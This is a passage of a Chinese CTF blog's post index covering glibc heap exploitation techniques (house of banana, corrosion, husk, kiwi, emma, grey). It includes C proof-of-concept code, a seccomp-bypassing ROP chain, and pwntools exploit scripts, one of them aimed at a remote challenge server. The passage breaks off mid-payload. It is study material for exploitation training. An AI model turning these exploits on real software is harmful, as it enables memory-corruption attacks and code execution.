*/\n\n\n\n查看info的结构体，这里的伪造方式我直接引用我参考的博客来写\n在fake+0x110处写入fake+0x40，然后在fake+0x48写入fake+0x58然后在fake+0x58写入shell\n在fake+0x120出写入fake+0x48，在fake+0x50处写入8\n总结利用方式首先劫持结构体：\n​    &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake\n绕过检测：\n​    fake+0x28 = fake\n​    fake+0x31c = 0x1c\n控制array：\n​    fake+0x110 = fake+0x40\n​    fake+0x48 = fake+0x58\n​    fake+0x58 = shell\n控制i：\n​    fake+0x120 = fake+0x48\n​    fake+0x50 = 8\n需要注意的\n上面说的maps需要四个元素，然后我懒得调试就没在glibc2.31下调试，所以就直接写poc但是存在问题，后面调试发现其实需要的是7个\nunsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;\n\n所以如果是在glibc2.31下我们劫持结构体的方式应该变为：\n​    &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next) = fake\n后续的内容一致\npoc下面是我自己写的poc，我将large bin attack的步骤省略了：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;void shell()&#123;    system(&quot;/bin/sh&quot;);&#125;int main()&#123;    uint64_t *target;    uint64_t *fake;    uint64_t main_arena_96;    uint64_t *rtld_global_addr;    fake = (uint64_t *)malloc(0x420);    malloc(0x10);    free(fake);    main_arena_96 = *(uint64_t *)fake;    rtld_global_addr = (uint64_t *)main_arena_96 + (0x259480 / 8);    target = (uint64_t *)rtld_global_addr - 0x4b128 / 8;    fake = (uint64_t *)malloc(0x420);    memset((void *)fake, 0, 0x420);    *(uint64_t *)target = (uint64_t)fake;    *(uint64_t *)(fake + 0x28 / 8) = fake;    *(uint64_t *)(fake + 0x31c / 8) = 0x1c00000000;    *(uint64_t *)(fake + 0x110 / 8) = fake + 0x40 / 8;    *(uint64_t *)(fake + 0x48 / 8) = fake + 0x58 / 8;    *(uint64_t *)(fake + 0x58 / 8) = (uint64_t)shell;    *(uint64_t *)(fake + 0x120 / 8) = fake + 0x48 / 8;    *(uint64_t *)(fake + 0x50 / 8) = 8;    return 0;&#125;\n\n\n参考博客https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/\n大佬这里最后的poc在除了上面我说的之外存在还一点小问题，应该是忘了给每个地址除以8\n","categories":["pwn"],"tags":["house of 系列","fini","house of banana"]},{"title":"house of corrosion/husk/kiwi","url":"/2022/03/11/house-of-corrosion-husk-kiwi/","content":"这篇文章过后估计就会慢下来更新了，内核一直拖着没学，再就是自己逆向能力很差所以也打算多练点题了，因为时间关系这篇文章我就少一点源码的讲解了。\nhouse of corrosion在large bin attack和tcache stashing unlink当中我们可以实现任意地址写入很大的数，那么我们写入这个数的作用是什么呢？\n这一利用方式就是通过其他攻击方式修改global_max_fast的值为一个很大的值，这就导致我们生成的chunk为一个fast bin chunk，然而chunk在进入fast bin时是遵循一定规律的，free时会根据size进入到相应的地址，这也就促使我们可以进一步利用了。\n首先这里的计算公式为：\nchunk size = ((target - main_arena) * 2) - 0x10\n\n第一种方式也就是在fastbinY后的任意地址写入堆地址\n\n当我们取出这个chunk时，会将fd指针留在相应的位置，所以如果存在UAF就可以更进一步的实现任意地址写任意值\n\n下面是以上两个方法的poc可以直接在glibc2.31下使用\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define offset2size(ofs) ((ofs)*2 - 0x10)#define MAIN_ARENA 0x1ebb80#define MAIN_ARENA_DELTA 0x60#define GLOBAL_MAX_FAST 0x1eeb80#define PRINTF_FUNCTABLE 0x1f0ff8#define PRINTF_ARGINFO 0x1f1350#define ONE_GADGET 0xe6c81int main(void)&#123;    unsigned long libc_base;    char *ptr0;    char *ptr1;    char *ptr2;    setbuf(stdout, NULL);    ptr0 = malloc(0x500);    ptr1 = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));    ptr2 = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));    free(ptr0);    libc_base = *(unsigned long *)ptr0 - MAIN_ARENA - MAIN_ARENA_DELTA;    uint64_t *aaa = libc_base + GLOBAL_MAX_FAST;    *aaa = ptr0;    free(ptr1);    free(ptr2);    strcpy(ptr1, &quot;aaaaaaaa&quot;);    malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));    return 0;&#125;\n\nhouse of husk这一堆利用主要针对的是printf的利用链，具体链子不再关心，我们的最终效果是劫持__printf_function_table和__printf_arginfo_table到我们堆地址，然后伪造格式化字符串对应的地址的值one_gadget\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#define offset2size(ofs) ((ofs) * 2 - 0x10)#define MAIN_ARENA       0x1ebb80#define MAIN_ARENA_DELTA 0x60#define GLOBAL_MAX_FAST  0x1eeb80#define PRINTF_FUNCTABLE 0x1f0ff8#define PRINTF_ARGINFO   0x1f1350#define ONE_GADGET       0xe6c81int main (void)&#123;  unsigned long libc_base;  char *a[10];  setbuf(stdout, NULL);  a[0] = malloc(0x500);  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));  a[3] = malloc(0x500);  free(a[0]);  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;  printf(&quot;libc @ 0x%lxn&quot;, libc_base);  *(unsigned long*)(a[2] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;  uint64_t *aaa=libc_base+GLOBAL_MAX_FAST;  *aaa=a[0];  free(a[1]);  free(a[2]);  printf(&quot;%X&quot;, 0);  return 0;&#125;\n\n最终实现的就是污染掉__printf_arginfo_table但是另一个table也不能为null所以也伪造上，不过不需要弄什么数据。\n具体过程大家可以去调试，这里用到了house of corrosion\nhouse of kiwi这一调用链通过触发__malloc_assert，调用fflush进而调用stderr中的_IO_file_jumps中的sync指针\n触发的方式也会有很多种，这里常用的就是在验证top chunk中的一种，house of force这篇文章中利用这是需要绕过这一assert，可以去看一下是什么assert\ngdb调试assert时发现fflush调用的是位于_IO_file_jumps中的_IO_file_sync指针,且观察发现RDX寄存器的值为IO_helper_jumps指针,多次调试发现RDX始终是一个固定的地址\n如果存在一个任意写,通过修改 _IO_file_jumps + 0x60的_IO_file_sync指针为setcontext+61修改IO_helper_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/filter.h&gt;#include &lt;linux/seccomp.h&gt;#define pop_rdi_ret libc_base + 0x000000000002858F#define pop_rdx_r12 libc_base + 0x0000000000114161#define pop_rsi_ret libc_base + 0x000000000002AC3F#define pop_rax_ret libc_base + 0x0000000000045580#define syscall_ret libc_base + 0x00000000000611EA#define ret pop_rdi_ret+1size_t libc_base;size_t ROP[0x30];char FLAG[0x100] = &quot;./flag.txt\\x00&quot;;void sandbox()&#123;    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    struct sock_filter sfi[] =&#123;        &#123;0x20,0x00,0x00,0x00000004&#125;,        &#123;0x15,0x00,0x05,0xC000003E&#125;,        &#123;0x20,0x00,0x00,0x00000000&#125;,        &#123;0x35,0x00,0x01,0x40000000&#125;,        &#123;0x15,0x00,0x02,0xFFFFFFFF&#125;,        &#123;0x15,0x01,0x00,0x0000003B&#125;,        &#123;0x06,0x00,0x00,0x7FFF0000&#125;,        &#123;0x06,0x00,0x00,0x00000000&#125;    &#125;;    struct sock_fprog sfp = &#123;8, sfi&#125;;    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);&#125;void setROP()&#123;    uint32_t i = 0;    ROP[i++] = pop_rax_ret;    ROP[i++] = 2;    ROP[i++] = pop_rdi_ret;    ROP[i++] = (size_t)FLAG;    ROP[i++] = pop_rsi_ret;    ROP[i++] = 0;    ROP[i++] = syscall_ret;    ROP[i++] = pop_rdi_ret;    ROP[i++] = 3;    ROP[i++] = pop_rdx_r12;    ROP[i++] = 0x100;    ROP[i++] = 0;    ROP[i++] = pop_rsi_ret;    ROP[i++] = (size_t)(FLAG + 0x10);    ROP[i++] = (size_t)read;    ROP[i++] = pop_rdi_ret;    ROP[i++] = 1;    ROP[i++] = (size_t)write;&#125;int main() &#123;    setvbuf(stdin,0LL,2,0LL);    setvbuf(stdout,0LL,2,0LL);    setvbuf(stderr,0LL,2,0LL);    sandbox();    libc_base  = ((size_t)setvbuf) - 0x81630;    printf(&quot;LIBC:\\t%#lx\\n&quot;,libc_base);    size_t magic_gadget = libc_base + 0x53030 + 61; // setcontext + 61    size_t IO_helper = libc_base + 0x1E48C0; // _IO_hel    per_jumps;    size_t SYNC = libc_base + 0x1E5520; // sync pointer in _IO_file_jumps    setROP();    *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp    *((size_t*)IO_helper + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址    *((size_t*)SYNC) = magic_gadget; // 设置fflush(stderr)中调用的指令地址    // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert    size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);    *top_size = (*top_size)&amp;0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在    malloc(0x1000); // 触发assert    _exit(-1);&#125;\n\n可以看到就只是劫持了sync为setcontext+61然后就是通过IO_helper控制rdx进而控制其他所有寄存器，实现ROP\n例题的话，后续会更一篇NULL_FxCK，因为用的Glibc为2.32所以会出现一系列问题，所以不增加这篇文章篇幅了\n\n参考链接：https://www.anquanke.com/post/id/235598\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of emma","url":"/2022/05/17/house-of-emma/","content":"在glibc2.34中删除了malloc_hook和free_hook，所以孕育而生了一个新的利用方法house of emma。这篇文章需要两个前置知识largebin attack和house of kiwi在这里就不再提了。然后后面一篇文章上次好像提了是写how2heap在glibc2.31之后的变化总结，不过会新加一个利用方式也是我今天才知道的Fastbin Reverse Into Tcache(先给自己挖个坑)\n利用原理为什么说house of emma的前置知识需要house of kiwi是因为其退出的方式是_exit(0)所以没有办法使用以往的fsop的方式来进行，调用的链子还是使用assert来触发。他们之间的不同点就是这里利用的vtable不一样。\nstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_file_finish),  JUMP_INIT(overflow, _IO_file_overflow),  JUMP_INIT(underflow, _IO_file_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_default_pbackfail),  JUMP_INIT(xsputn, _IO_file_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_cookie_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_file_setbuf),  JUMP_INIT(sync, _IO_file_sync),  JUMP_INIT(doallocate, _IO_file_doallocate),  JUMP_INIT(read, _IO_cookie_read),  JUMP_INIT(write, _IO_cookie_write),  JUMP_INIT(seek, _IO_cookie_seek),  JUMP_INIT(close, _IO_cookie_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue),&#125;;\n\n这里使用的是上面的这个vtable，其中的几个函数\nstatic ssize_t_IO_cookie_read (FILE *fp, void *buf, ssize_t size)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_read_function_t *read_cb = cfile-&gt;__io_functions.read;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (read_cb);#endif  if (read_cb == NULL)    return -1;  return read_cb (cfile-&gt;__cookie, buf, size);&#125;static ssize_t_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_write_function_t *write_cb = cfile-&gt;__io_functions.write;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (write_cb);#endif  if (write_cb == NULL)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      return 0;    &#125;  ssize_t n = write_cb (cfile-&gt;__cookie, buf, size);  if (n &lt; size)    fp-&gt;_flags |= _IO_ERR_SEEN;  return n;&#125;static off64_t_IO_cookie_seek (FILE *fp, off64_t offset, int dir)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_seek_function_t *seek_cb = cfile-&gt;__io_functions.seek;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (seek_cb);#endif  return ((seek_cb == NULL       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)           == -1)       || offset == (off64_t) -1)      ? _IO_pos_BAD : offset);&#125;static int_IO_cookie_close (FILE *fp)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_close_function_t *close_cb = cfile-&gt;__io_functions.close;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (close_cb);#endif  if (close_cb == NULL)    return 0;  return close_cb (cfile-&gt;__cookie);&#125;\n\n都是直接调用指针当作函数来调用，也就存在了一定的安全隐患了。\n\n这里查看汇编代码可以看到是将取出来的值首先循环右移了0x11接着与fs:0x30进行异或之后检验rax是否为空，最后再调用rax。\n#  define PTR_MANGLE(var) \\  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)#  define PTR_DEMANGLE(var)     PTR_MANGLE (var)\n\n其实异或这一部也就是上面调用的这个函数干的事情。所以如果我们想要劫持程序执行流还必须泄漏这个的话就很麻烦了，所以我们不选择泄漏他的值，我们选择覆盖他的值，后面在往这里写入地址的时候作相应的处理即可。\n题目house of emma题目的逆向过程没什么好说的又不是cpp，所以这里就不再提。\n然后题目存在的漏洞就是free之后没有清空指针导致UAF了。\n其实懂了上面所描述的这道题就很好理解了，直接可以自己做出来了。\nexpfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)r = process(&#x27;./pwn&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;payload = b&#x27;&#x27;def create(idx, size):    global payload    payload += p8(0x1)    payload += p8(idx)    payload += p16(size)def delete(idx):    global payload    payload += p8(0x2)    payload += p8(idx)def show(idx):    global payload    payload += p8(0x3)    payload += p8(idx)def edit(idx, content):    global payload    payload += p8(0x4)    payload += p8(idx)    print(len(content))    payload += p16(len(content))    payload += contentdef run():    global payload    payload += p8(0x5)    if len(payload) &gt; 0x500:        error(&#x27;!!!&#x27;)    r.recvuntil(b&#x27;Pls input the opcode&#x27;)    r.send(payload)    payload = b&#x27;&#x27;create(0, 0x410)create(1, 0x410)create(2, 0x420)create(3, 0x430)delete(2)run()show(2)run()r.recvline()libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x1f30b0print(hex(libc_base))gadget_addr = libc_base + 0x146020pointer_chk_guard_local = libc_base + 0x234c10 + 0x2000setcontext_addr = libc_base + 0x50bfdpop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rax = libc_base + next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))syscall = libc_base + next(libc.search(asm(&#x27;syscall\\nret&#x27;)))edit(2, b&#x27;a&#x27; * 0x10)show(2)run()r.recvuntil(b&#x27;a&#x27; * 0x10)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x2ae0print(hex(heap_base))delete(0)edit(    2,    flat(libc_base + 0x1f30b0, libc_base + 0x1f30b0, heap_base + 0x2ae0,         libc_base + libc.symbols[&#x27;stderr&#x27;] - 0x20))create(5, 0x430)create(0, 0x410)run()delete(0)edit(    2,    flat(libc_base + 0x1f30b0, libc_base + 0x1f30b0, heap_base + 0x2ae0,         pointer_chk_guard_local))create(6, 0x430)run()def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)create(7, 0x450)delete(7)create(8, 0x430)run()edit(7, b&#x27;a&#x27; * 0x430 + flat(0, 0x300))run()next_chain = 0srop_addr = heap_base + 0x2ae0 + 0x10fake_IO_FILE = 2 * p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0xffffffffffffffff)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(next_chain)fake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(heap_base)fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0)fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(libc.sym[&#x27;_IO_cookie_jumps&#x27;] + 0x40)fake_IO_FILE += p64(srop_addr)fake_IO_FILE += p64(0)fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))fake_frame_addr = srop_addrframe = SigreturnFrame()frame.rdi = fake_frame_addr + 0xF8frame.rsi = 0frame.rdx = 0x100frame.rsp = fake_frame_addr + 0xF8 + 0x10frame.rip = pop_rdi + 1rop_data = [    pop_rax, 2, syscall, pop_rax, 0, pop_rdi, 3, pop_rsi,    fake_frame_addr + 0x200, syscall, pop_rax, 1, pop_rdi, 1, pop_rsi,    fake_frame_addr + 0x200, syscall]pay = p64(0) + p64(fake_frame_addr) + b&#x27;\\x00&#x27; * 0x10 + p64(setcontext_addr +                                                           61)pay += bytes(frame).ljust(0xF8, b&#x27;\\x00&#x27;)[0x28:] + b&#x27;flag&#x27;.ljust(    0x10, b&#x27;\\x00&#x27;) + flat(rop_data)edit(0, pay)edit(2, fake_IO_FILE)run()create(9, 0x450)run()gdb.attach(r)r.interactive()\n\n反思与总结上面exp其实是跑不通的，主要原因就是ld在不同环境的偏移不一致导致的，在我的docker环境中pointer_chk_guard_local指针的地址位于不可写的地方，所以我就随便找到了个地方代替他，就假装修改了。\n这一利用方式中可以看出来大量使用了large bin attack，并且题目的并没有存在可以任意地址写的漏洞，或者说是构造出这样一个漏洞出来，所以这一利用方式的限制条件其实也比较小。\n\n参考文章：\nhttps://blog.wjhwjhn.com/archives/751/\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house_of_grey","url":"/2022/01/05/house-of-grey/","content":"/procLinux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。\n可以看到效果类似与gdb的vmmap。\n检查保护\n保护全开\n流程分析void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char buf; // [rsp+1Bh] [rbp-25h] BYREF  int stat_loc; // [rsp+1Ch] [rbp-24h] BYREF  int fd; // [rsp+20h] [rbp-20h]  __pid_t pid; // [rsp+24h] [rbp-1Ch]  __int64 v7; // [rsp+28h] [rbp-18h] BYREF  char *v8; // [rsp+30h] [rbp-10h]  unsigned __int64 v9; // [rsp+38h] [rbp-8h]  v9 = __readfsqword(0x28u);  sub_F35(a1, a2, a3);  puts(&quot;Welcome to my house! Enjoy yourself!\\n&quot;);  puts(&quot;Do you want to help me build my room? Y/n?&quot;);  read(0, &amp;buf, 4uLL);  if ( buf == 121 || buf == 89 )  &#123;    fd = open(&quot;/dev/urandom&quot;, 0);    if ( fd &lt; 0 )    &#123;      perror(&quot;open&quot;);      exit(1);    &#125;    read(fd, &amp;v7, 8uLL);    close(fd);    v7 &amp;= 0xFFFFF0u;    v8 = (char *)mmap(0LL, 0x10000000uLL, 3, 131106, -1, 0LL);    if ( v8 == (char *)-1LL )    &#123;      perror(&quot;mmap&quot;);      exit(1);    &#125;    pid = clone(fn, &amp;v8[v7], 256, 0LL);    if ( pid == -1 )    &#123;      perror(&quot;clone&quot;);      exit(1);    &#125;    waitpid(pid, &amp;stat_loc, 0x80000000);    if ( (stat_loc &amp; 0x7F) != 0 )      puts(&quot;\\nMaybe something wrong? Build failed!&quot;);    else      puts(&quot;\\nBuild finished! Thanks a lot!&quot;);    exit(0);  &#125;  puts(&quot;You don&#x27;t help me? OK, just get out of my hosue!&quot;);  exit(0);&#125;\n\n首先是创建映射，然后将将映射的随机部分当作fn函数的堆栈区\nvoid __fastcall fn(void *arg)&#123;  unsigned __int64 v1; // rsi  int fd; // [rsp+10h] [rbp-70h]  int i; // [rsp+14h] [rbp-6Ch]  int v4; // [rsp+1Ch] [rbp-64h]  int v5; // [rsp+1Ch] [rbp-64h]  void *v6; // [rsp+20h] [rbp-60h]  char buf[24]; // [rsp+30h] [rbp-50h] BYREF  void *v8; // [rsp+48h] [rbp-38h]  char nptr[40]; // [rsp+50h] [rbp-30h] BYREF  unsigned __int64 v10; // [rsp+78h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts(&quot;You get into my room. Just find something!\\n&quot;);  v6 = malloc(0x186A0uLL);  if ( !v6 )  &#123;    perror(&quot;malloc&quot;);    exit(1);  &#125;  if ( (unsigned int)sub_14D2() )    exit(1);  v8 = v6;  for ( i = 0; i &lt;= 29; ++i )  &#123;    switch ( (unsigned int)sub_FEE() )    &#123;      case 1u:        puts(&quot;So man, what are you finding?&quot;);        buf[(int)(read(0, buf, 0x28uLL) - 1)] = 0;        if ( (unsigned int)sub_FA6(buf) )        &#123;          puts(&quot;Man, don&#x27;t do it! See you^.&quot;);          exit(1);        &#125;        fd = open(buf, 0);        if ( fd &lt; 0 )        &#123;          perror(&quot;open&quot;);          exit(1);        &#125;        return;      case 2u:        puts(&quot;So, Where are you?&quot;);        read(0, nptr, 0x20uLL);        v1 = strtoull(nptr, 0LL, 10);        lseek(fd, v1, 0);        break;      case 3u:        puts(&quot;How many things do you want to get?&quot;);        read(0, nptr, 8uLL);        v4 = atoi(nptr);        if ( v4 &lt;= 100000 )        &#123;          v5 = read(fd, v8, v4);          if ( v5 &lt; 0 )          &#123;            puts(&quot;error read&quot;);            perror(&quot;read&quot;);            exit(1);          &#125;          puts(&quot;You get something:&quot;);          write(1, v8, v5);        &#125;        else        &#123;          puts(&quot;You greedy man!&quot;);        &#125;        break;      case 4u:        puts(&quot;What do you want to give me?&quot;);        puts(&quot;content: &quot;);        read(0, v8, 0x200uLL);        break;      case 5u:        exit(0);      default:        continue;    &#125;  &#125;  puts(&quot;\\nI guess you don&#x27;t want to say Goodbye!&quot;);  puts(&quot;But sadly, bye! Hope you come again!\\n&quot;);  exit(0);&#125;\n\n这里四个功能就是，第一个：输入要读的文件名，第二个：改变便宜指针，第三个：获取文件内容，第四个：输入数据\n漏洞：buf存在缓冲区溢出可以覆盖v8指针导致任意地址写\n利用分析利用读取任意文件读取/proc/self/maps然后获得程序加载基地址，再者就是获取自己创建的映射关系\n\nfind(b&#x27;/proc/self/maps&#x27;)get()r.recvuntil(b&#x27;You get something:\\n&#x27;)process_base = int(r.recvuntil(b&#x27;-&#x27;, drop=True), 16)success(&quot;process_base:&quot;+hex(process_base))puts_addr = process_base+puts_pltread_addr = process_base+read_pltopen_addr = process_base+open_pltpop_rdi_addr = process_base+pop_rdipop_rsi_r15_addr = process_base+pop_rsi_r15r.recvuntil(b&#x27;[heap]\\n&#x27;)stack_arr = str(r.recvuntil(b&#x27; rw-p &#x27;, drop=True), encoding=&#x27;utf-8&#x27;).split(&#x27;-&#x27;)print(stack_arr)stack_start = int(stack_arr[0], 16)success(&quot;stack_start:&quot;+hex(stack_start))stack_end = int(stack_arr[1], 16)print(&quot;stack_start:&quot;+hex(stack_start))print(&quot;stack_end:&quot;, hex(stack_end))\n\n接着思路就是利用mem劫持执行流，但是在看ida的代码\n\n程序都是以exit(0)结束，导致在fn我们无法进行ROP。所以思路就是我们覆盖掉read函数的ret地址来进行ROP。\n首先需要确定read的ret地址，但是我们连这个上面存放的什么都不知道所以很难操作，所以我们选择寻找buf的位置。\nfind(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)# 这一句千万别忘了，我就是忘了找一句导致一直跑不出来。    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        break    elif i==23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)\n\n其实buf地址的计算式很好就可以理解。\n但是光知道buf地址我们还是没法进行ROP。所以下一步就是求read的ret地址\n\n可以看到buf距离rsp的地址其实是0x30，但是在执行call _read指令时会执行push ip这条命令，执行完ret也就是pop ip。所以push进去之后rsp又会降低8个字节。所以此时read的ret地址距离buf的地址是0x38(以上是我个人对于0x38的猜测，因为其他博客并没有说清楚，可能是觉得太简单了，有错误欢迎大家在下方留言评论)。\n所以获得ret地址的代码也就是在上面加点小改动\nfind(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        ret_addr = buf_addr-0x38        break    elif i == 23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)\n\n最后就是利用任意地址写构建ROP了，但是程序禁止了execve所以没法system这种了，选择open-&gt;read-&gt;puts就好了\n\nexpfrom pwn import *elf = ELF(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)# r = process(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 50398)context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000001823pop_rsi_r15 = 0x0000000000001821open_plt = elf.plt[&#x27;open&#x27;]read_plt = elf.plt[&#x27;read&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]def find(name):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;So man, what are you finding?&#x27;)    r.sendline(name)def locate(pos):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;So, Where are you?&#x27;)    r.sendline(bytes(str(pos), encoding=&#x27;utf-8&#x27;))def get():    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;How many things do you want to get?&#x27;)    r.sendline(b&#x27;100000&#x27;)def give(content):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)r.recvuntil(b&#x27;Do you want to help me build my room? Y/n?&#x27;)r.sendline(b&#x27;y&#x27;)find(b&#x27;/proc/self/maps&#x27;)get()r.recvuntil(b&#x27;You get something:\\n&#x27;)process_base = int(r.recvuntil(b&#x27;-&#x27;, drop=True), 16)success(&quot;process_base:&quot;+hex(process_base))puts_addr = process_base+puts_pltread_addr = process_base+read_pltopen_addr = process_base+open_pltpop_rdi_addr = process_base+pop_rdipop_rsi_r15_addr = process_base+pop_rsi_r15r.recvuntil(b&#x27;[heap]\\n&#x27;)stack_arr = str(r.recvuntil(b&#x27; rw-p &#x27;, drop=True), encoding=&#x27;utf-8&#x27;).split(&#x27;-&#x27;)print(stack_arr)stack_start = int(stack_arr[0], 16)success(&quot;stack_start:&quot;+hex(stack_start))stack_end = int(stack_arr[1], 16)print(&quot;stack_start:&quot;+hex(stack_start))print(&quot;stack_end:&quot;, hex(stack_end))find(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        ret_addr = buf_addr-0x38        break    elif i == 23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)find(b&#x27;/proc/self/mem&#x27;.ljust(0x18, b&#x27;\\x00&#x27;)+p64(ret_addr))flag_addr = ret_addr+8*15payload = p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + 